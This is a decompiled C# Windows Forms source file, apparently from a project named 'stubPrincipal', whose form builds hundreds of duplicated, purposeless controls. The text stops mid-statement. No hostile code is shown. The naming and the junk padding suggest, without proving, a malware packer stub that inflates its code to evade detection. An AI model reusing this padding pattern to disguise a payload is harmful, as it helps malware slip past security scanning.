using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace stubPrincipal
{
	// Token: 0x02000009 RID: 9
	[DesignerGenerated]
	public class Bereta : Form
	{
		// Token: 0x06000016 RID: 22 RVA: 0x000021BC File Offset: 0x000003BC
		public Bereta()
		{
			base.Load += this.Bereta_Load;
			this.InitializeComponent();
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000021DC File Offset: 0x000003DC
		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x0000221C File Offset: 0x0000041C
		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.Button1 = new Button();
			this.CheckBox1 = new CheckBox();
			this.CheckedListBox1 = new CheckedListBox();
			this.DateTimePicker1 = new DateTimePicker();
			this.ComboBox1 = new ComboBox();
			this.Label1 = new Label();
			this.ListView1 = new ListView();
			this.MaskedTextBox1 = new MaskedTextBox();
			this.MonthCalendar1 = new MonthCalendar();
			this.NumericUpDown1 = new NumericUpDown();
			this.RadioButton1 = new RadioButton();
			this.RichTextBox1 = new RichTextBox();
			this.TextBox1 = new TextBox();
			this.WebBrowser1 = new WebBrowser();
			this.PictureBox1 = new PictureBox();
			this.PictureBox2 = new PictureBox();
			this.ProgressBar1 = new ProgressBar();
			this.MaskedTextBox2 = new MaskedTextBox();
			this.LinkLabel1 = new LinkLabel();
			this.ListBox1 = new ListBox();
			this.ComboBox2 = new ComboBox();
			this.CheckedListBox2 = new CheckedListBox();
			this.CheckedListBox3 = new CheckedListBox();
			this.ComboBox3 = new ComboBox();
			this.ListBox2 = new ListBox();
			this.LinkLabel2 = new LinkLabel();
			this.MaskedTextBox3 = new MaskedTextBox();
			this.ProgressBar2 = new ProgressBar();
			this.PictureBox3 = new PictureBox();
			this.PictureBox4 = new PictureBox();
			this.WebBrowser2 = new WebBrowser();
			this.TextBox2 = new TextBox();
			this.RichTextBox2 = new RichTextBox();
			this.RadioButton2 = new RadioButton();
			this.NumericUpDown2 = new NumericUpDown();
			this.MonthCalendar2 = new MonthCalendar();
			this.MaskedTextBox4 = new MaskedTextBox();
			this.ListView2 = new ListView();
			this.Label2 = new Label();
			this.ComboBox4 = new ComboBox();
			this.DateTimePicker2 = new DateTimePicker();
			this.CheckedListBox4 = new CheckedListBox();
			this.CheckBox2 = new CheckBox();
			this.Button2 = new Button();
			this.CheckedListBox5 = new CheckedListBox();
			this.ComboBox5 = new ComboBox();
			this.ListBox3 = new ListBox();
			this.LinkLabel3 = new LinkLabel();
			this.MaskedTextBox5 = new MaskedTextBox();
			this.ProgressBar3 = new ProgressBar();
			this.PictureBox5 = new PictureBox();
			this.PictureBox6 = new PictureBox();
			this.WebBrowser3 = new WebBrowser();
			this.TextBox3 = new TextBox();
			this.RichTextBox3 = new RichTextBox();
			this.RadioButton3 = new RadioButton();
			this.NumericUpDown3 = new NumericUpDown();
			this.MonthCalendar3 = new MonthCalendar();
			this.MaskedTextBox6 = new MaskedTextBox();
			this.ListView3 = new ListView();
			this.Label3 = new Label();
			this.ComboBox6 = new ComboBox();
			this.DateTimePicker3 = new DateTimePicker();
			this.CheckedListBox6 = new CheckedListBox();
			this.CheckBox3 = new CheckBox();
			this.Button3 = new Button();
			this.CheckedListBox7 = new CheckedListBox();
			this.ComboBox7 = new ComboBox();
			this.ListBox4 = new ListBox();
			this.LinkLabel4 = new LinkLabel();
			this.MaskedTextBox7 = new MaskedTextBox();
			this.ProgressBar4 = new ProgressBar();
			this.PictureBox7 = new PictureBox();
			this.PictureBox8 = new PictureBox();
			this.WebBrowser4 = new WebBrowser();
			this.TextBox4 = new TextBox();
			this.RichTextBox4 = new RichTextBox();
			this.RadioButton4 = new RadioButton();
			this.NumericUpDown4 = new NumericUpDown();
			this.MonthCalendar4 = new MonthCalendar();
			this.MaskedTextBox8 = new MaskedTextBox();
			this.ListView4 = new ListView();
			this.Label4 = new Label();
			this.ComboBox8 = new ComboBox();
			this.DateTimePicker4 = new DateTimePicker();
			this.CheckedListBox8 = new CheckedListBox();
			this.CheckBox4 = new CheckBox();
			this.Button4 = new Button();
			this.CheckedListBox9 = new CheckedListBox();
			this.ComboBox9 = new ComboBox();
			this.ListBox5 = new ListBox();
			this.LinkLabel5 = new LinkLabel();
			this.MaskedTextBox9 = new MaskedTextBox();
			this.ProgressBar5 = new ProgressBar();
			this.PictureBox9 = new PictureBox();
			this.PictureBox10 = new PictureBox();
			this.WebBrowser5 = new WebBrowser();
			this.TextBox5 = new TextBox();
			this.RichTextBox5 = new RichTextBox();
			this.RadioButton5 = new RadioButton();
			this.NumericUpDown5 = new NumericUpDown();
			this.MonthCalendar5 = new MonthCalendar();
			this.MaskedTextBox10 = new MaskedTextBox();
			this.ListView5 = new ListView();
			this.Label5 = new Label();
			this.ComboBox10 = new ComboBox();
			this.DateTimePicker5 = new DateTimePicker();
			this.CheckedListBox10 = new CheckedListBox();
			this.CheckBox5 = new CheckBox();
			this.Button5 = new Button();
			this.CheckedListBox11 = new CheckedListBox();
			this.ComboBox11 = new ComboBox();
			this.ListBox6 = new ListBox();
			this.LinkLabel6 = new LinkLabel();
			this.MaskedTextBox11 = new MaskedTextBox();
			this.ProgressBar6 = new ProgressBar();
			this.PictureBox11 = new PictureBox();
			this.PictureBox12 = new PictureBox();
			this.WebBrowser6 = new WebBrowser();
			this.TextBox6 = new TextBox();
			this.RichTextBox6 = new RichTextBox();
			this.RadioButton6 = new RadioButton();
			this.NumericUpDown6 = new NumericUpDown();
			this.MonthCalendar6 = new MonthCalendar();
			this.MaskedTextBox12 = new MaskedTextBox();
			this.ListView6 = new ListView();
			this.Label6 = new Label();
			this.ComboBox12 = new ComboBox();
			this.DateTimePicker6 = new DateTimePicker();
			this.CheckedListBox12 = new CheckedListBox();
			this.CheckBox6 = new CheckBox();
			this.Button6 = new Button();
			this.CheckedListBox13 = new CheckedListBox();
			this.ComboBox13 = new ComboBox();
			this.ListBox7 = new ListBox();
			this.LinkLabel7 = new LinkLabel();
			this.MaskedTextBox13 = new MaskedTextBox();
			this.ProgressBar7 = new ProgressBar();
			this.PictureBox13 = new PictureBox();
			this.PictureBox14 = new PictureBox();
			this.WebBrowser7 = new WebBrowser();
			this.TextBox7 = new TextBox();
			this.RichTextBox7 = new RichTextBox();
			this.NumericUpDown7 = new NumericUpDown();
			this.MonthCalendar7 = new MonthCalendar();
			this.MaskedTextBox14 = new MaskedTextBox();
			this.ListView7 = new ListView();
			this.Label7 = new Label();
			this.ComboBox14 = new ComboBox();
			this.DateTimePicker7 = new DateTimePicker();
			this.CheckedListBox14 = new CheckedListBox();
			this.Button7 = new Button();
			this.CheckedListBox15 = new CheckedListBox();
			this.ComboBox15 = new ComboBox();
			this.ListBox8 = new ListBox();
			this.LinkLabel8 = new LinkLabel();
			this.MaskedTextBox15 = new MaskedTextBox();
			this.ProgressBar8 = new ProgressBar();
			this.PictureBox15 = new PictureBox();
			this.PictureBox16 = new PictureBox();
			this.WebBrowser8 = new WebBrowser();
			this.TextBox8 = new TextBox();
			this.RichTextBox8 = new RichTextBox();
			this.NumericUpDown8 = new NumericUpDown();
			this.MonthCalendar8 = new MonthCalendar();
			this.MaskedTextBox16 = new MaskedTextBox();
			this.ListView8 = new ListView();
			this.Label8 = new Label();
			this.ComboBox16 = new ComboBox();
			this.DateTimePicker8 = new DateTimePicker();
			this.CheckedListBox16 = new CheckedListBox();
			this.Button8 = new Button();
			this.CheckedListBox17 = new CheckedListBox();
			this.ComboBox17 = new ComboBox();
			this.ListBox9 = new ListBox();
			this.LinkLabel9 = new LinkLabel();
			this.MaskedTextBox17 = new MaskedTextBox();
			this.ProgressBar9 = new ProgressBar();
			this.PictureBox17 = new PictureBox();
			this.PictureBox18 = new PictureBox();
			this.WebBrowser9 = new WebBrowser();
			this.TextBox9 = new TextBox();
			this.RichTextBox9 = new RichTextBox();
			this.RadioButton7 = new RadioButton();
			this.NumericUpDown9 = new NumericUpDown();
			this.MonthCalendar9 = new MonthCalendar();
			this.MaskedTextBox18 = new MaskedTextBox();
			this.ListView9 = new ListView();
			this.Label9 = new Label();
			this.ComboBox18 = new ComboBox();
			this.DateTimePicker9 = new DateTimePicker();
			this.CheckedListBox18 = new CheckedListBox();
			this.Button9 = new Button();
			this.CheckedListBox19 = new CheckedListBox();
			this.ComboBox19 = new ComboBox();
			this.ListBox10 = new ListBox();
			this.LinkLabel10 = new LinkLabel();
			this.MaskedTextBox19 = new MaskedTextBox();
			this.ProgressBar10 = new ProgressBar();
			this.PictureBox19 = new PictureBox();
			this.PictureBox20 = new PictureBox();
			this.WebBrowser10 = new WebBrowser();
			this.TextBox10 = new TextBox();
			this.RichTextBox10 = new RichTextBox();
			this.NumericUpDown10 = new NumericUpDown();
			this.MonthCalendar10 = new MonthCalendar();
			this.MaskedTextBox20 = new MaskedTextBox();
			this.ListView10 = new ListView();
			this.Label10 = new Label();
			this.ComboBox20 = new ComboBox();
			this.DateTimePicker10 = new DateTimePicker();
			this.CheckedListBox20 = new CheckedListBox();
			this.Button10 = new Button();
			this.CheckedListBox21 = new CheckedListBox();
			this.ComboBox21 = new ComboBox();
			this.ListBox11 = new ListBox();
			this.LinkLabel11 = new LinkLabel();
			this.MaskedTextBox21 = new MaskedTextBox();
			this.ProgressBar11 = new ProgressBar();
			this.PictureBox21 = new PictureBox();
			this.PictureBox22 = new PictureBox();
			this.WebBrowser11 = new WebBrowser();
			this.TextBox11 = new TextBox();
			this.RichTextBox11 = new RichTextBox();
			this.RadioButton8 = new RadioButton();
			this.NumericUpDown11 = new NumericUpDown();
			this.MonthCalendar11 = new MonthCalendar();
			this.MaskedTextBox22 = new MaskedTextBox();
			this.ListView11 = new ListView();
			this.Label11 = new Label();
			this.ComboBox22 = new ComboBox();
			this.DateTimePicker11 = new DateTimePicker();
			this.CheckedListBox22 = new CheckedListBox();
			this.CheckBox7 = new CheckBox();
			this.Button11 = new Button();
			this.CheckedListBox23 = new CheckedListBox();
			this.ComboBox23 = new ComboBox();
			this.ListBox12 = new ListBox();
			this.LinkLabel12 = new LinkLabel();
			this.MaskedTextBox23 = new MaskedTextBox();
			this.ProgressBar12 = new ProgressBar();
			this.PictureBox23 = new PictureBox();
			this.PictureBox24 = new PictureBox();
			this.WebBrowser12 = new WebBrowser();
			this.TextBox12 = new TextBox();
			this.RichTextBox12 = new RichTextBox();
			this.RadioButton9 = new RadioButton();
			this.NumericUpDown12 = new NumericUpDown();
			this.MonthCalendar12 = new MonthCalendar();
			this.MaskedTextBox24 = new MaskedTextBox();
			this.ListView12 = new ListView();
			this.Label12 = new Label();
			this.ComboBox24 = new ComboBox();
			this.DateTimePicker12 = new DateTimePicker();
			this.CheckedListBox24 = new CheckedListBox();
			this.CheckBox8 = new CheckBox();
			this.Button12 = new Button();
			((ISupportInitialize)this.NumericUpDown1).BeginInit();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			((ISupportInitialize)this.PictureBox2).BeginInit();
			((ISupportInitialize)this.PictureBox3).BeginInit();
			((ISupportInitialize)this.PictureBox4).BeginInit();
			((ISupportInitialize)this.NumericUpDown2).BeginInit();
			((ISupportInitialize)this.PictureBox5).BeginInit();
			((ISupportInitialize)this.PictureBox6).BeginInit();
			((ISupportInitialize)this.NumericUpDown3).BeginInit();
			((ISupportInitialize)this.PictureBox7).BeginInit();
			((ISupportInitialize)this.PictureBox8).BeginInit();
			((ISupportInitialize)this.NumericUpDown4).BeginInit();
			((ISupportInitialize)this.PictureBox9).BeginInit();
			((ISupportInitialize)this.PictureBox10).BeginInit();
			((ISupportInitialize)this.NumericUpDown5).BeginInit();
			((ISupportInitialize)this.PictureBox11).BeginInit();
			((ISupportInitialize)this.PictureBox12).BeginInit();
			((ISupportInitialize)this.NumericUpDown6).BeginInit();
			((ISupportInitialize)this.PictureBox13).BeginInit();
			((ISupportInitialize)this.PictureBox14).BeginInit();
			((ISupportInitialize)this.NumericUpDown7).BeginInit();
			((ISupportInitialize)this.PictureBox15).BeginInit();
			((ISupportInitialize)this.PictureBox16).BeginInit();
			((ISupportInitialize)this.NumericUpDown8).BeginInit();
			((ISupportInitialize)this.PictureBox17).BeginInit();
			((ISupportInitialize)this.PictureBox18).BeginInit();
			((ISupportInitialize)this.NumericUpDown9).BeginInit();
			((ISupportInitialize)this.PictureBox19).BeginInit();
			((ISupportInitialize)this.PictureBox20).BeginInit();
			((ISupportInitialize)this.NumericUpDown10).BeginInit();
			((ISupportInitialize)this.PictureBox21).BeginInit();
			((ISupportInitialize)this.PictureBox22).BeginInit();
			((ISupportInitialize)this.NumericUpDown11).BeginInit();
			((ISupportInitialize)this.PictureBox23).BeginInit();
			((ISupportInitialize)this.PictureBox24).BeginInit();
			((ISupportInitialize)this.NumericUpDown12).BeginInit();
			base.SuspendLayout();
			this.Button1.Location = new Point(98, 101);
			this.Button1.Name = "Button1";
			this.Button1.Size = new Size(75, 23);
			this.Button1.TabIndex = 0;
			this.Button1.Text = "Button1";
			this.Button1.UseVisualStyleBackColor = true;
			this.CheckBox1.AutoSize = true;
			this.CheckBox1.Location = new Point(371, 12);
			this.CheckBox1.Name = "CheckBox1";
			this.CheckBox1.Size = new Size(81, 17);
			this.CheckBox1.TabIndex = 1;
			this.CheckBox1.Text = "CheckBox1";
			this.CheckBox1.UseVisualStyleBackColor = true;
			this.CheckedListBox1.FormattingEnabled = true;
			this.CheckedListBox1.Location = new Point(245, 89);
			this.CheckedListBox1.Name = "CheckedListBox1";
			this.CheckedListBox1.Size = new Size(120, 94);
			this.CheckedListBox1.TabIndex = 2;
			this.DateTimePicker1.Location = new Point(64, 239);
			this.DateTimePicker1.Name = "DateTimePicker1";
			this.DateTimePicker1.Size = new Size(200, 20);
			this.DateTimePicker1.TabIndex = 3;
			this.ComboBox1.FormattingEnabled = true;
			this.ComboBox1.Location = new Point(466, 102);
			this.ComboBox1.Name = "ComboBox1";
			this.ComboBox1.Size = new Size(121, 21);
			this.ComboBox1.TabIndex = 4;
			this.Label1.AutoSize = true;
			this.Label1.Location = new Point(175, 40);
			this.Label1.Name = "Label1";
			this.Label1.Size = new Size(39, 13);
			this.Label1.TabIndex = 5;
			this.Label1.Text = "Label1";
			this.ListView1.HideSelection = false;
			this.ListView1.Location = new Point(331, 211);
			this.ListView1.Name = "ListView1";
			this.ListView1.Size = new Size(121, 97);
			this.ListView1.TabIndex = 6;
			this.ListView1.UseCompatibleStateImageBehavior = false;
			this.MaskedTextBox1.Location = new Point(84, 183);
			this.MaskedTextBox1.Name = "MaskedTextBox1";
			this.MaskedTextBox1.Size = new Size(100, 20);
			this.MaskedTextBox1.TabIndex = 7;
			this.MonthCalendar1.Location = new Point(430, 135);
			this.MonthCalendar1.Name = "MonthCalendar1";
			this.MonthCalendar1.TabIndex = 8;
			this.NumericUpDown1.Location = new Point(457, 66);
			this.NumericUpDown1.Name = "NumericUpDown1";
			this.NumericUpDown1.Size = new Size(120, 20);
			this.NumericUpDown1.TabIndex = 9;
			this.RadioButton1.AutoSize = true;
			this.RadioButton1.Location = new Point(44, 18);
			this.RadioButton1.Name = "RadioButton1";
			this.RadioButton1.Size = new Size(90, 17);
			this.RadioButton1.TabIndex = 10;
			this.RadioButton1.TabStop = true;
			this.RadioButton1.Text = "RadioButton1";
			this.RadioButton1.UseVisualStyleBackColor = true;
			this.RichTextBox1.Location = new Point(32, 75);
			this.RichTextBox1.Name = "RichTextBox1";
			this.RichTextBox1.Size = new Size(100, 96);
			this.RichTextBox1.TabIndex = 11;
			this.RichTextBox1.Text = "";
			this.TextBox1.Location = new Point(66, 274);
			this.TextBox1.Name = "TextBox1";
			this.TextBox1.Size = new Size(100, 20);
			this.TextBox1.TabIndex = 12;
			this.WebBrowser1.Location = new Point(16, 202);
			this.WebBrowser1.MinimumSize = new Size(20, 20);
			this.WebBrowser1.Name = "WebBrowser1";
			this.WebBrowser1.Size = new Size(62, 57);
			this.WebBrowser1.TabIndex = 13;
			this.PictureBox1.Location = new Point(386, 102);
			this.PictureBox1.Name = "PictureBox1";
			this.PictureBox1.Size = new Size(8, 8);
			this.PictureBox1.TabIndex = 14;
			this.PictureBox1.TabStop = false;
			this.PictureBox2.Location = new Point(386, 40);
			this.PictureBox2.Name = "PictureBox2";
			this.PictureBox2.Size = new Size(168, 91);
			this.PictureBox2.TabIndex = 15;
			this.PictureBox2.TabStop = false;
			this.ProgressBar1.Location = new Point(236, 280);
			this.ProgressBar1.Name = "ProgressBar1";
			this.ProgressBar1.Size = new Size(100, 23);
			this.ProgressBar1.TabIndex = 16;
			this.MaskedTextBox2.Location = new Point(217, 232);
			this.MaskedTextBox2.Name = "MaskedTextBox2";
			this.MaskedTextBox2.Size = new Size(100, 20);
			this.MaskedTextBox2.TabIndex = 17;
			this.LinkLabel1.AutoSize = true;
			this.LinkLabel1.Location = new Point(248, 48);
			this.LinkLabel1.Name = "LinkLabel1";
			this.LinkLabel1.Size = new Size(59, 13);
			this.LinkLabel1.TabIndex = 18;
			this.LinkLabel1.TabStop = true;
			this.LinkLabel1.Text = "LinkLabel1";
			this.ListBox1.FormattingEnabled = true;
			this.ListBox1.Location = new Point(238, 148);
			this.ListBox1.Name = "ListBox1";
			this.ListBox1.Size = new Size(120, 95);
			this.ListBox1.TabIndex = 19;
			this.ComboBox2.FormattingEnabled = true;
			this.ComboBox2.Location = new Point(160, 72);
			this.ComboBox2.Name = "ComboBox2";
			this.ComboBox2.Size = new Size(8, 21);
			this.ComboBox2.TabIndex = 20;
			this.CheckedListBox2.FormattingEnabled = true;
			this.CheckedListBox2.Location = new Point(142, 85);
			this.CheckedListBox2.Name = "CheckedListBox2";
			this.CheckedListBox2.Size = new Size(120, 94);
			this.CheckedListBox2.TabIndex = 21;
			this.CheckedListBox3.FormattingEnabled = true;
			this.CheckedListBox3.Location = new Point(134, 85);
			this.CheckedListBox3.Name = "CheckedListBox3";
			this.CheckedListBox3.Size = new Size(120, 94);
			this.CheckedListBox3.TabIndex = 43;
			this.ComboBox3.FormattingEnabled = true;
			this.ComboBox3.Location = new Point(152, 72);
			this.ComboBox3.Name = "ComboBox3";
			this.ComboBox3.Size = new Size(8, 21);
			this.ComboBox3.TabIndex = 42;
			this.ListBox2.FormattingEnabled = true;
			this.ListBox2.Location = new Point(230, 148);
			this.ListBox2.Name = "ListBox2";
			this.ListBox2.Size = new Size(120, 95);
			this.ListBox2.TabIndex = 41;
			this.LinkLabel2.AutoSize = true;
			this.LinkLabel2.Location = new Point(240, 48);
			this.LinkLabel2.Name = "LinkLabel2";
			this.LinkLabel2.Size = new Size(59, 13);
			this.LinkLabel2.TabIndex = 40;
			this.LinkLabel2.TabStop = true;
			this.LinkLabel2.Text = "LinkLabel2";
			this.MaskedTextBox3.Location = new Point(209, 232);
			this.MaskedTextBox3.Name = "MaskedTextBox3";
			this.MaskedTextBox3.Size = new Size(100, 20);
			this.MaskedTextBox3.TabIndex = 39;
			this.ProgressBar2.Location = new Point(228, 280);
			this.ProgressBar2.Name = "ProgressBar2";
			this.ProgressBar2.Size = new Size(100, 23);
			this.ProgressBar2.TabIndex = 38;
			this.PictureBox3.Location = new Point(378, 40);
			this.PictureBox3.Name = "PictureBox3";
			this.PictureBox3.Size = new Size(168, 91);
			this.PictureBox3.TabIndex = 37;
			this.PictureBox3.TabStop = false;
			this.PictureBox4.Location = new Point(378, 102);
			this.PictureBox4.Name = "PictureBox4";
			this.PictureBox4.Size = new Size(8, 8);
			this.PictureBox4.TabIndex = 36;
			this.PictureBox4.TabStop = false;
			this.WebBrowser2.Location = new Point(8, 202);
			this.WebBrowser2.MinimumSize = new Size(20, 20);
			this.WebBrowser2.Name = "WebBrowser2";
			this.WebBrowser2.Size = new Size(62, 57);
			this.WebBrowser2.TabIndex = 35;
			this.TextBox2.Location = new Point(58, 274);
			this.TextBox2.Name = "TextBox2";
			this.TextBox2.Size = new Size(100, 20);
			this.TextBox2.TabIndex = 34;
			this.RichTextBox2.Location = new Point(24, 75);
			this.RichTextBox2.Name = "RichTextBox2";
			this.RichTextBox2.Size = new Size(100, 96);
			this.RichTextBox2.TabIndex = 33;
			this.RichTextBox2.Text = "";
			this.RadioButton2.AutoSize = true;
			this.RadioButton2.Location = new Point(36, 18);
			this.RadioButton2.Name = "RadioButton2";
			this.RadioButton2.Size = new Size(90, 17);
			this.RadioButton2.TabIndex = 32;
			this.RadioButton2.TabStop = true;
			this.RadioButton2.Text = "RadioButton2";
			this.RadioButton2.UseVisualStyleBackColor = true;
			this.NumericUpDown2.Location = new Point(449, 66);
			this.NumericUpDown2.Name = "NumericUpDown2";
			this.NumericUpDown2.Size = new Size(120, 20);
			this.NumericUpDown2.TabIndex = 31;
			this.MonthCalendar2.Location = new Point(422, 135);
			this.MonthCalendar2.Name = "MonthCalendar2";
			this.MonthCalendar2.TabIndex = 30;
			this.MaskedTextBox4.Location = new Point(76, 183);
			this.MaskedTextBox4.Name = "MaskedTextBox4";
			this.MaskedTextBox4.Size = new Size(100, 20);
			this.MaskedTextBox4.TabIndex = 29;
			this.ListView2.HideSelection = false;
			this.ListView2.Location = new Point(323, 211);
			this.ListView2.Name = "ListView2";
			this.ListView2.Size = new Size(121, 97);
			this.ListView2.TabIndex = 28;
			this.ListView2.UseCompatibleStateImageBehavior = false;
			this.Label2.AutoSize = true;
			this.Label2.Location = new Point(167, 40);
			this.Label2.Name = "Label2";
			this.Label2.Size = new Size(39, 13);
			this.Label2.TabIndex = 27;
			this.Label2.Text = "Label2";
			this.ComboBox4.FormattingEnabled = true;
			this.ComboBox4.Location = new Point(458, 102);
			this.ComboBox4.Name = "ComboBox4";
			this.ComboBox4.Size = new Size(121, 21);
			this.ComboBox4.TabIndex = 26;
			this.DateTimePicker2.Location = new Point(56, 239);
			this.DateTimePicker2.Name = "DateTimePicker2";
			this.DateTimePicker2.Size = new Size(200, 20);
			this.DateTimePicker2.TabIndex = 25;
			this.CheckedListBox4.FormattingEnabled = true;
			this.CheckedListBox4.Location = new Point(237, 89);
			this.CheckedListBox4.Name = "CheckedListBox4";
			this.CheckedListBox4.Size = new Size(120, 94);
			this.CheckedListBox4.TabIndex = 24;
			this.CheckBox2.AutoSize = true;
			this.CheckBox2.Location = new Point(363, 12);
			this.CheckBox2.Name = "CheckBox2";
			this.CheckBox2.Size = new Size(81, 17);
			this.CheckBox2.TabIndex = 23;
			this.CheckBox2.Text = "CheckBox2";
			this.CheckBox2.UseVisualStyleBackColor = true;
			this.Button2.Location = new Point(90, 101);
			this.Button2.Name = "Button2";
			this.Button2.Size = new Size(75, 23);
			this.Button2.TabIndex = 22;
			this.Button2.Text = "Button2";
			this.Button2.UseVisualStyleBackColor = true;
			this.CheckedListBox5.FormattingEnabled = true;
			this.CheckedListBox5.Location = new Point(126, 73);
			this.CheckedListBox5.Name = "CheckedListBox5";
			this.CheckedListBox5.Size = new Size(120, 94);
			this.CheckedListBox5.TabIndex = 65;
			this.ComboBox5.FormattingEnabled = true;
			this.ComboBox5.Location = new Point(144, 60);
			this.ComboBox5.Name = "ComboBox5";
			this.ComboBox5.Size = new Size(8, 21);
			this.ComboBox5.TabIndex = 64;
			this.ListBox3.FormattingEnabled = true;
			this.ListBox3.Location = new Point(222, 136);
			this.ListBox3.Name = "ListBox3";
			this.ListBox3.Size = new Size(120, 95);
			this.ListBox3.TabIndex = 63;
			this.LinkLabel3.AutoSize = true;
			this.LinkLabel3.Location = new Point(232, 36);
			this.LinkLabel3.Name = "LinkLabel3";
			this.LinkLabel3.Size = new Size(59, 13);
			this.LinkLabel3.TabIndex = 62;
			this.LinkLabel3.TabStop = true;
			this.LinkLabel3.Text = "LinkLabel3";
			this.MaskedTextBox5.Location = new Point(201, 220);
			this.MaskedTextBox5.Name = "MaskedTextBox5";
			this.MaskedTextBox5.Size = new Size(100, 20);
			this.MaskedTextBox5.TabIndex = 61;
			this.ProgressBar3.Location = new Point(220, 268);
			this.ProgressBar3.Name = "ProgressBar3";
			this.ProgressBar3.Size = new Size(100, 23);
			this.ProgressBar3.TabIndex = 60;
			this.PictureBox5.Location = new Point(370, 28);
			this.PictureBox5.Name = "PictureBox5";
			this.PictureBox5.Size = new Size(168, 91);
			this.PictureBox5.TabIndex = 59;
			this.PictureBox5.TabStop = false;
			this.PictureBox6.Location = new Point(370, 90);
			this.PictureBox6.Name = "PictureBox6";
			this.PictureBox6.Size = new Size(8, 8);
			this.PictureBox6.TabIndex = 58;
			this.PictureBox6.TabStop = false;
			this.WebBrowser3.Location = new Point(0, 190);
			this.WebBrowser3.MinimumSize = new Size(20, 20);
			this.WebBrowser3.Name = "WebBrowser3";
			this.WebBrowser3.Size = new Size(62, 57);
			this.WebBrowser3.TabIndex = 57;
			this.TextBox3.Location = new Point(50, 262);
			this.TextBox3.Name = "TextBox3";
			this.TextBox3.Size = new Size(100, 20);
			this.TextBox3.TabIndex = 56;
			this.RichTextBox3.Location = new Point(16, 63);
			this.RichTextBox3.Name = "RichTextBox3";
			this.RichTextBox3.Size = new Size(100, 96);
			this.RichTextBox3.TabIndex = 55;
			this.RichTextBox3.Text = "";
			this.RadioButton3.AutoSize = true;
			this.RadioButton3.Location = new Point(28, 6);
			this.RadioButton3.Name = "RadioButton3";
			this.RadioButton3.Size = new Size(90, 17);
			this.RadioButton3.TabIndex = 54;
			this.RadioButton3.TabStop = true;
			this.RadioButton3.Text = "RadioButton3";
			this.RadioButton3.UseVisualStyleBackColor = true;
			this.NumericUpDown3.Location = new Point(441, 54);
			this.NumericUpDown3.Name = "NumericUpDown3";
			this.NumericUpDown3.Size = new Size(120, 20);
			this.NumericUpDown3.TabIndex = 53;
			this.MonthCalendar3.Location = new Point(414, 123);
			this.MonthCalendar3.Name = "MonthCalendar3";
			this.MonthCalendar3.TabIndex = 52;
			this.MaskedTextBox6.Location = new Point(68, 171);
			this.MaskedTextBox6.Name = "MaskedTextBox6";
			this.MaskedTextBox6.Size = new Size(100, 20);
			this.MaskedTextBox6.TabIndex = 51;
			this.ListView3.HideSelection = false;
			this.ListView3.Location = new Point(315, 199);
			this.ListView3.Name = "ListView3";
			this.ListView3.Size = new Size(121, 97);
			this.ListView3.TabIndex = 50;
			this.ListView3.UseCompatibleStateImageBehavior = false;
			this.Label3.AutoSize = true;
			this.Label3.Location = new Point(159, 28);
			this.Label3.Name = "Label3";
			this.Label3.Size = new Size(39, 13);
			this.Label3.TabIndex = 49;
			this.Label3.Text = "Label3";
			this.ComboBox6.FormattingEnabled = true;
			this.ComboBox6.Location = new Point(450, 90);
			this.ComboBox6.Name = "ComboBox6";
			this.ComboBox6.Size = new Size(121, 21);
			this.ComboBox6.TabIndex = 48;
			this.DateTimePicker3.Location = new Point(48, 227);
			this.DateTimePicker3.Name = "DateTimePicker3";
			this.DateTimePicker3.Size = new Size(200, 20);
			this.DateTimePicker3.TabIndex = 47;
			this.CheckedListBox6.FormattingEnabled = true;
			this.CheckedListBox6.Location = new Point(229, 77);
			this.CheckedListBox6.Name = "CheckedListBox6";
			this.CheckedListBox6.Size = new Size(120, 94);
			this.CheckedListBox6.TabIndex = 46;
			this.CheckBox3.AutoSize = true;
			this.CheckBox3.Location = new Point(355, 0);
			this.CheckBox3.Name = "CheckBox3";
			this.CheckBox3.Size = new Size(81, 17);
			this.CheckBox3.TabIndex = 45;
			this.CheckBox3.Text = "CheckBox3";
			this.CheckBox3.UseVisualStyleBackColor = true;
			this.Button3.Location = new Point(82, 89);
			this.Button3.Name = "Button3";
			this.Button3.Size = new Size(75, 23);
			this.Button3.TabIndex = 44;
			this.Button3.Text = "Button3";
			this.Button3.UseVisualStyleBackColor = true;
			this.CheckedListBox7.FormattingEnabled = true;
			this.CheckedListBox7.Location = new Point(134, 81);
			this.CheckedListBox7.Name = "CheckedListBox7";
			this.CheckedListBox7.Size = new Size(120, 94);
			this.CheckedListBox7.TabIndex = 87;
			this.ComboBox7.FormattingEnabled = true;
			this.ComboBox7.Location = new Point(152, 68);
			this.ComboBox7.Name = "ComboBox7";
			this.ComboBox7.Size = new Size(8, 21);
			this.ComboBox7.TabIndex = 86;
			this.ListBox4.FormattingEnabled = true;
			this.ListBox4.Location = new Point(230, 144);
			this.ListBox4.Name = "ListBox4";
			this.ListBox4.Size = new Size(120, 95);
			this.ListBox4.TabIndex = 85;
			this.LinkLabel4.AutoSize = true;
			this.LinkLabel4.Location = new Point(240, 44);
			this.LinkLabel4.Name = "LinkLabel4";
			this.LinkLabel4.Size = new Size(59, 13);
			this.LinkLabel4.TabIndex = 84;
			this.LinkLabel4.TabStop = true;
			this.LinkLabel4.Text = "LinkLabel4";
			this.MaskedTextBox7.Location = new Point(209, 228);
			this.MaskedTextBox7.Name = "MaskedTextBox7";
			this.MaskedTextBox7.Size = new Size(100, 20);
			this.MaskedTextBox7.TabIndex = 83;
			this.ProgressBar4.Location = new Point(228, 276);
			this.ProgressBar4.Name = "ProgressBar4";
			this.ProgressBar4.Size = new Size(100, 23);
			this.ProgressBar4.TabIndex = 82;
			this.PictureBox7.Location = new Point(378, 36);
			this.PictureBox7.Name = "PictureBox7";
			this.PictureBox7.Size = new Size(168, 91);
			this.PictureBox7.TabIndex = 81;
			this.PictureBox7.TabStop = false;
			this.PictureBox8.Location = new Point(378, 98);
			this.PictureBox8.Name = "PictureBox8";
			this.PictureBox8.Size = new Size(8, 8);
			this.PictureBox8.TabIndex = 80;
			this.PictureBox8.TabStop = false;
			this.WebBrowser4.Location = new Point(8, 198);
